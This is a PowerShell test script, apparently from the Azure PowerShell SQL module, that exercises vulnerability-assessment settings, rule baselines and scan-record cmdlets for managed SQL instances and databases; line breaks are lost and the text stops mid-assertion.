function Test-VulnerabilityAssessmentManagedInstanceSettingsTest{$testSuffix = getAssetNameCreate-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix$params = Get-SqlVulnerabilityAssessmentManagedInstanceTestEnvironmentParameters $testSuffix$vnetName = "cl_initial"$subnetName = "Cool"$virtualNetwork1 = CreateAndGetVirtualNetworkForManagedInstance $vnetName $subnetName$subnetId = $virtualNetwork1.Subnets.where({ $_.Name -eq $subnetName })[0].Id$credentials = Get-ServerCredential$licenseType = "BasePrice"$storageSizeInGB = 32$vCore = 16$skuName = "GP_Gen4"$location = "West Central US"try{Enable-AzSqlInstanceAdvancedDataSecurity -ResourceGroupName $params.rgname -InstanceName $params.serverName -DoNotConfigureVulnerabilityAssessmentAssert-ThrowsContains -script { Update-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-StorageAccountName $params.storageAccount -EmailAdmins $true -NotificationEmail @("invalidMail") -RecurringScansInterval Weekly } `-message "One or more of the email addresses you entered are not valid.."Assert-ThrowsContains -script { Update-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-BlobStorageSasUri "https://invalid.blob.core.windows.netXXXXXXXXXXXXXXX"} `-message "Invalid BlobStorageSasUri parameter value. The value should be in format of https://mystorage.blob.core.windows.net/vulnerability-assessment?st=XXXXXX."Update-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-StorageAccountName $params.storageAccount$settings = Get-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName Assert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual "vulnerability-assessment" $settings.ScanResultsContainerNameAssert-AreEqual $params.storageAccount $settings.StorageAccountName	Assert-AreEqual None $settings.RecurringScansIntervalAssert-AreEqual $true $settings.EmailAdminsAssert-AreEqualArray @() $settings.NotificationEmail$testEmailAdmins = $true$testNotificationEmail = @("test1@mailTest.com", "test2@mailTest.com")$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::WeeklyUpdate-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `-NotificationEmail $testNotificationEmail$settings = Get-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName Assert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual "vulnerability-assessment" $settings.ScanResultsContainerNameAssert-AreEqual $params.storageAccount $settings.StorageAccountName	Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansIntervalAssert-AreEqual $testEmailAdmins $settings.EmailAdminsAssert-AreEqualArray $testNotificationEmail $settings.NotificationEmailClear-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName$settings = Get-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverNameAssert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual "" $settings.ScanResultsContainerNameAssert-AreEqual "" $settings.StorageAccountName	Assert-AreEqual None $settings.RecurringScansIntervalAssert-AreEqual $true $settings.EmailAdminsAssert-Null $settings.NotificationEmail$testScanResultsContainerName = "custom-container"$testStorageName = "storage1"$testBlobStorageSasUri = "https://" + $testStorageName +".blob.core.windows.net/" + $testScanResultsContainerName + "?st=XXXXXXXXXXXXXXX"$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::NoneUpdate-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-BlobStorageSasUri $testBlobStorageSasUri -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `-NotificationEmail $testNotificationEmail$newManagedInstanceName = "newManagedInstanceName" +$testSuffix;$testNewNotificationEmail = @("test3@mailTest.com", "test4@mailTest.com")$testStorageName = $params.storageAccount$testBlobStorageSasUri = "https://" + $testStorageName +".blob.core.windows.net/" + $testScanResultsContainerName + "?st=XXXXXXXXXXXXXXX"$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::NoneNew-AzSqlInstance -ResourceGroupName $params.rgname -Name $newManagedInstanceName `-Location $location -AdministratorCredential $credentials -SubnetId $subnetId `-LicenseType $licenseType -StorageSizeInGB $storageSizeInGB -Vcore $vCore -SkuName $skuNameEnable-AzSqlInstanceAdvancedDataSecurity -ResourceGroupName $params.rgname -InstanceName $newManagedInstanceName -DoNotConfigureVulnerabilityAssessmentUpdate-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $newManagedInstanceName `-BlobStorageSasUri $testBlobStorageSasUri -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `-NotificationEmail $testNewNotificationEmailGet-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $newManagedInstanceName | Update-AzSqlInstanceVulnerabilityAssessmentSetting `-ResourceGroupName $params.rgname -InstanceName $params.serverName$settings = Get-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName Assert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual $testScanResultsContainerName $settings.ScanResultsContainerNameAssert-AreEqual $testStorageName $settings.StorageAccountName	Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansIntervalAssert-AreEqual $testEmailAdmins $settings.EmailAdminsAssert-AreEqualArray $testNewNotificationEmail $settings.NotificationEmail$settings = Get-AzSqlInstance -ResourceGroupName $params.rgname -Name $params.serverName | Get-AzSqlInstanceVulnerabilityAssessmentSetting Assert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual $testScanResultsContainerName $settings.ScanResultsContainerNameAssert-AreEqual $testStorageName $settings.StorageAccountName	Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansIntervalAssert-AreEqual $testEmailAdmins $settings.EmailAdminsAssert-AreEqualArray $testNewNotificationEmail $settings.NotificationEmail$settings = Get-AzSqlInstance -ResourceGroupName $params.rgname -Name $params.serverName | Clear-AzSqlInstanceVulnerabilityAssessmentSetting Assert-Null $settings$testEmailAdmins = $false$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::WeeklyUpdate-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-StorageAccountName $params.storageAccount -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins$settings = Get-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName Assert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual $params.storageAccount $settings.StorageAccountName	Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansIntervalAssert-AreEqual $testEmailAdmins $settings.EmailAdminsAssert-Null $settings.NotificationEmailClear-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverNameUpdate-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-StorageAccountName $params.storageAccount -WhatIf$settings = Get-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverNameAssert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual "" $settings.ScanResultsContainerNameAssert-AreEqual "" $settings.StorageAccountName	Assert-AreEqual None $settings.RecurringScansIntervalAssert-AreEqual $true $settings.EmailAdminsAssert-Null $settings.NotificationEmailUpdate-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-BlobStorageSasUri $testBlobStorageSasUriClear-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-WhatIfGet-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName}finally{Remove-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix}}function Test-VulnerabilityAssessmentManagedDatabaseWithSettingsNotDefinedTest{$testSuffix = getAssetNameCreate-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix$params = Get-SqlVulnerabilityAssessmentManagedInstanceTestEnvironmentParameters $testSuffixtry{$ruleId = "VA2031"$scanId = "myCustomScanId"$baselineResults = @(@("userA", "SELECT"),@("userB", "SELECT"))Enable-AzSqlInstanceAdvancedDataSecurity -ResourceGroupName $params.rgname -InstanceName $params.serverName -DoNotConfigureVulnerabilityAssessmentAssert-Throws { Set-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId -BaselineResult $baselineResults }Assert-Throws { Get-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId }Assert-Throws { Clear-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId }Assert-Throws { Convert-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -ScanId $scanId }Assert-Throws { Get-AzSqlInstanceDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -ScanId $scanId }Assert-Throws { Start-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -ScanId $scanId }}finally{Remove-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix}}function Test-VulnerabilityAssessmentManagedDatabaseSettingsTest{$testSuffix = getAssetNameCreate-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix$params = Get-SqlVulnerabilityAssessmentManagedInstanceTestEnvironmentParameters $testSuffixtry{Enable-AzSqlInstanceAdvancedDataSecurity -ResourceGroupName $params.rgname -InstanceName $params.serverName -DoNotConfigureVulnerabilityAssessmentAssert-ThrowsContains -script { Update-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-StorageAccountName $params.storageAccount -EmailAdmins $true -NotificationEmail @("invalidMail") -RecurringScansInterval Weekly } `-message "One or more of the email addresses you entered are not valid.."Assert-ThrowsContains -script { Update-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-BlobStorageSasUri "https://invalid.blob.core.windows.netXXXXXXXXXXXXXXX"} `-message "Invalid BlobStorageSasUri parameter value. The value should be in format of https://mystorage.blob.core.windows.net/vulnerability-assessment?st=XXXXXX."Update-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-StorageAccountName $params.storageAccount$settings = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName Assert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual $params.databaseName $settings.DatabaseNameAssert-AreEqual "vulnerability-assessment" $settings.ScanResultsContainerNameAssert-AreEqual $params.storageAccount $settings.StorageAccountName	Assert-AreEqual None $settings.RecurringScansIntervalAssert-AreEqual $true $settings.EmailAdminsAssert-AreEqualArray @() $settings.NotificationEmail$testEmailAdmins = $true$testNotificationEmail = @("test1@mailTest.com", "test2@mailTest.com")$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::WeeklyUpdate-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `-NotificationEmail $testNotificationEmail$settings = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName Assert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual $params.databaseName $settings.DatabaseNameAssert-AreEqual "vulnerability-assessment" $settings.ScanResultsContainerNameAssert-AreEqual $params.storageAccount $settings.StorageAccountName	Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansIntervalAssert-AreEqual $testEmailAdmins $settings.EmailAdminsAssert-AreEqualArray $testNotificationEmail $settings.NotificationEmailClear-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName$settings = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseNameAssert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual "" $settings.ScanResultsContainerNameAssert-AreEqual "" $settings.StorageAccountName	Assert-AreEqual None $settings.RecurringScansIntervalAssert-AreEqual $true $settings.EmailAdminsAssert-Null $settings.NotificationEmail$testScanResultsContainerName = "custom-container"$testStorageName = "storage1"$testBlobStorageSasUri = "https://" + $testStorageName +".blob.core.windows.net/" + $testScanResultsContainerName + "?st=XXXXXXXXXXXXXXX"$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::NoneUpdate-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-BlobStorageSasUri $testBlobStorageSasUri -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `-NotificationEmail $testNotificationEmail$newDatabaseName = "newManagedDatabaseName";$testNewNotificationEmail = @("test3@mailTest.com", "test4@mailTest.com")$testStorageName = $params.storageAccount$testBlobStorageSasUri = "https://" + $testStorageName +".blob.core.windows.net/" + $testScanResultsContainerName + "?st=XXXXXXXXXXXXXXX"$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::None$collation = "SQL_Latin1_General_CP1_CI_AS"New-AzSqlInstanceDatabase -Name $newDatabaseName -ResourceGroupName $params.rgname -InstanceName $params.serverName -Collation $collationUpdate-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $newDatabaseName `-BlobStorageSasUri $testBlobStorageSasUri -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `-NotificationEmail $testNewNotificationEmailGet-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $newDatabaseName | Update-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting `-ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName$settings = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName Assert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual $params.databaseName $settings.DatabaseNameAssert-AreEqual $testScanResultsContainerName $settings.ScanResultsContainerNameAssert-AreEqual $testStorageName $settings.StorageAccountName	Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansIntervalAssert-AreEqual $testEmailAdmins $settings.EmailAdminsAssert-AreEqualArray $testNewNotificationEmail $settings.NotificationEmail$settings = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName | Get-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting Assert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual $params.databaseName $settings.DatabaseNameAssert-AreEqual $testScanResultsContainerName $settings.ScanResultsContainerNameAssert-AreEqual $testStorageName $settings.StorageAccountName	Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansIntervalAssert-AreEqual $testEmailAdmins $settings.EmailAdminsAssert-AreEqualArray $testNewNotificationEmail $settings.NotificationEmail$settings = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName | Clear-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting Assert-Null $settings$testEmailAdmins = $false$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::WeeklyUpdate-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-StorageAccountName $params.storageAccount -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins$settings = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName Assert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual $params.databaseName $settings.DatabaseNameAssert-AreEqual $params.storageAccount $settings.StorageAccountName	Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansIntervalAssert-AreEqual $testEmailAdmins $settings.EmailAdminsAssert-Null $settings.NotificationEmailClear-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseNameUpdate-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-StorageAccountName $params.storageAccount -WhatIf$settings = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseNameAssert-AreEqual $params.rgname $settings.ResourceGroupNameAssert-AreEqual $params.serverName $settings.InstanceNameAssert-AreEqual "" $settings.ScanResultsContainerNameAssert-AreEqual "" $settings.StorageAccountName	Assert-AreEqual None $settings.RecurringScansIntervalAssert-AreEqual $true $settings.EmailAdminsAssert-Null $settings.NotificationEmailUpdate-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-BlobStorageSasUri $testBlobStorageSasUriClear-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-WhatIfGet-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName}finally{Remove-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix}}function Test-VulnerabilityAssessmentManagedDatabaseBaselineTest{$testSuffix = getAssetNameCreate-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix$params = Get-SqlVulnerabilityAssessmentManagedInstanceTestEnvironmentParameters $testSuffixtry{Enable-AzSqlInstanceAdvancedDataSecurity -ResourceGroupName $params.rgname -InstanceName $params.serverName -DoNotConfigureVulnerabilityAssessmentUpdate-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-StorageAccountName $params.storageAccount$ruleId = "VA2108"$baselineDoesntExistsErrorMessage = "Baseline does not exist for rule 'VA2108'."Assert-ThrowsContains -script { Get-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId } -message $baselineDoesntExistsErrorMessageAssert-ThrowsContains -script { Clear-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId } -message $baselineDoesntExistsErrorMessage$baselineToSet = @( 'Principal1', 'db_ddladmin', 'SQL_USER', 'None'), @( 'Principal2', 'db_ddladmin', 'SQL_USER', 'None')Set-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId -BaselineResult $baselineToSet$baseline = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleIdAssert-AreEqual $params.rgname $baseline.ResourceGroupNameAssert-AreEqual $params.serverName $baseline.InstanceNameAssert-AreEqual $params.databaseName $baseline.DatabaseNameAssert-AreEqual $ruleId $baseline.RuleIdAssert-AreEqual $false $baseline.RuleAppliesToMasterAssert-AreEqualArray $baselineToSet[0] $baseline.BaselineResult[0].ResultAssert-AreEqualArray $baselineToSet[1] $baseline.BaselineResult[1].Result$baselineToSet = @( 'Principal3', 'db_ddladmin', 'SQL_USER', 'None'), @( 'Principal4', 'db_ddladmin', 'SQL_USER', 'None')Set-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId -BaselineResult $baselineToSet$baseline = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleIdAssert-AreEqual $params.rgname $baseline.ResourceGroupNameAssert-AreEqual $params.serverName $baseline.InstanceNameAssert-AreEqual $params.databaseName $baseline.DatabaseNameAssert-AreEqual $ruleId $baseline.RuleIdAssert-AreEqual $false $baseline.RuleAppliesToMasterAssert-AreEqualArray $baselineToSet[0] $baseline.BaselineResult[0].ResultAssert-AreEqualArray $baselineToSet[1] $baseline.BaselineResult[1].ResultClear-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleIdAssert-ThrowsContains -script { Get-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId } -message $baselineDoesntExistsErrorMessageAssert-ThrowsContains -script { Clear-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId } -message $baselineDoesntExistsErrorMessageSet-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId -BaselineResult $baselineToSetAssert-ThrowsContains -script { Get-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId -RuleAppliesToMaster } -message $baselineDoesntExistsErrorMessageAssert-ThrowsContains -script { Clear-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId -RuleAppliesToMaster} -message $baselineDoesntExistsErrorMessageSet-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId -RuleAppliesToMaster -BaselineResult $baselineToSet$baseline = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName`| Get-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -RuleId $ruleId -RuleAppliesToMasterAssert-AreEqual $params.rgname $baseline.ResourceGroupNameAssert-AreEqual $params.serverName $baseline.InstanceNameAssert-AreEqual $params.databaseName $baseline.DatabaseNameAssert-AreEqual $ruleId $baseline.RuleIdAssert-AreEqual $true $baseline.RuleAppliesToMasterAssert-AreEqualArray $baselineToSet[0] $baseline.BaselineResult[0].ResultAssert-AreEqualArray $baselineToSet[1] $baseline.BaselineResult[1].ResultClear-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId -RuleAppliesToMasterSet-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId -BaselineResult $baselineToSetGet-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId | Set-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline$baseline = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName | Get-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline `-RuleId $ruleIdAssert-AreEqual $params.rgname $baseline.ResourceGroupNameAssert-AreEqual $params.serverName $baseline.InstanceNameAssert-AreEqual $params.databaseName $baseline.DatabaseNameAssert-AreEqual $ruleId $baseline.RuleIdAssert-AreEqual $false $baseline.RuleAppliesToMasterAssert-AreEqualArray $baselineToSet[0] $baseline.BaselineResult[0].ResultAssert-AreEqualArray $baselineToSet[1] $baseline.BaselineResult[1].ResultGet-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName | Clear-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline `-RuleId $ruleIdAssert-ThrowsContains -script { Get-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId } -message $baselineDoesntExistsErrorMessageSet-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId -BaselineResult $baselineToSet -WhatIfAssert-ThrowsContains -script { Clear-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId } -message $baselineDoesntExistsErrorMessageSet-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId -BaselineResult $baselineToSetClear-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -RuleId $ruleId -WhatIfClear-AzSqlInstanceDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-RuleId $ruleId}finally{Remove-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix}}function Test-VulnerabilityAssessmentManagedDatabaseScanRecordGetListTest{$testSuffix = getAssetNameCreate-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix$params = Get-SqlVulnerabilityAssessmentManagedInstanceTestEnvironmentParameters $testSuffixtry{Enable-AzSqlInstanceAdvancedDataSecurity -ResourceGroupName $params.rgname -InstanceName $params.serverName -DoNotConfigureVulnerabilityAssessmentUpdate-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-StorageAccountName $params.storageAccounttry{Start-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName }catch{if ((Get-SqlTestMode) -eq 'Playback'){}else{throw;}}$scanId1 = "cmdletGetListScan"$scanJob = Start-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName -ScanId $scanId1 -AsJob$scanJob | Wait-Job$scanRecord1 = $scanJob | Receive-JobAssert-AreEqual $params.rgname $scanRecord1.ResourceGroupNameAssert-AreEqual $params.serverName $scanRecord1.InstanceName Assert-AreEqual $params.databaseName $scanRecord1.DatabaseName Assert-AreEqual $scanId1 $scanRecord1.ScanIdAssert-AreEqual "OnDemand" $scanRecord1.TriggerType$scanRecord1FromGet = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName -ScanId $scanId1Assert-AreEqual $scanRecord1FromGet.ResourceGroupName $scanRecord1.ResourceGroupNameAssert-AreEqual $scanRecord1FromGet.InstanceName $scanRecord1.InstanceNameAssert-AreEqual $scanRecord1FromGet.DatabaseName $scanRecord1.DatabaseNameAssert-AreEqual $scanRecord1FromGet.ScanId $scanRecord1.ScanIdAssert-AreEqual 